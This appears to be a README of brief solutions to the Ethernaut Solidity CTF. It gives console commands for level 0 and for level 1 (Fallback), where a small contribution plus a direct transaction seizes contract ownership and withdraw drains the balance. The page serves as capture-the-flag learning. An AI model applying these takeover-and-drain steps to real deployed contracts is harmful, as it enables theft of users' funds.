# The Ethernaut CTF Challenge Solutions

*The Ethernaut is a Web3/Solidity based wargame inspired by [overthewire.org](https://overthewire.org/wargames/), played in the Ethereum Virtual Machine. Each level is a smart contract that needs to be 'hacked'. The game is 100% open source and all levels are contributions made by other players.*

Brief solutions for OpenZeppelin's Ethernaut CTF. Writeups pending.

**Completed**

[Level 0: Hello Ethernaut](#HelloEthernaut)  
[Level 1: Fallback](#Fallback)  
[Level 2: Fallout](#Fallout)  

**Pending**

[Level 3: Coin Flip](#CoinFlip)  
[Level 4: Telephone](#Telephone)  
[Level 5: Token](#Token)  
[Level 6: Delegation](#Delegation)  
[Level 7: Force](#Force)  
[Level 8: Vault](#Vault)  
[Level 9: King](#King)  
[Level 10: Re-entrancy](#Reentrancy)  
[Level 11: Elevator](#Elevator)  
[Level 12: Privacy](#Privacy)  
[Level 13: Gatekeeper One](#GatekeeperOne)  
[Level 14: Gatekeeper Two](#GatekeeperTwo)  
[Level 15: Naught Coin](#NaughtCoin)  
[Level 16: Preservation](#Preservation)  
[Level 17: Recovery](#Recovery)  
[Level 18: Magic Number](#MagicNumber)  
[Level 19: Alien Codex](#AlienCodex)  
[Level 20: Denial](#Denial)  
[Level 21: Shop](#Shop)  
[Level 22: Dex](#Dex)  
[Level 23: Dex Two](#DexTwo)  
[Level 24: Puzzle Wallet](#PuzzleWallet)  
[Level 25: Motorbike](#Motorbike)  
[Level 26: Double Entry Point](#DoubleEntryPoint)  
[Level 27: Good Samaritan](#GoodSamaritan)  


## Requirements
- [Metamask](https://metamask.io/)


## <a name='HelloEthernaut'></a> 0. Hello Ethernaut
> This level walks you through the very basics of how to play the game.


```js
// We call the functions in the order as suggested 
> await contract.info()
< 'You will find what you need in info1().'

> await contract.info1()
< 'Try info2(), but with "hello" as a parameter.'

> await contract.info2("hello")
< 'The property infoNum holds the number of the next info method to call.'

> x = contract.infoNum()
// We expand the promise to reveal "42"

> await contract.info42()
< 'theMethodName is the name of the next method.'

> await contract.theMethodName()
< 'The method name is method7123949.'

> await contract.method7123949()
< 'If you know the password, submit it to authenticate().'

> await contract.password()
< 'ethernaut0'

> await contract.authenticate("ethernaut0")
```




## <a name='Fallback'></a> 1. Fallback
> You will beat this level if:
> 1. You claim ownership of the contract
> 2. You reduce its balance to 0

```js
// First, we contribute some ether:
await contract.contribute({value: 5})

// Then we send some ether to make us the owner
sendTransaction({from: player, to: instance, value: 5})

// Verify we have claimed ownership
await contract.owner()

// Reduce balance to 0
await contract.withdraw()

```
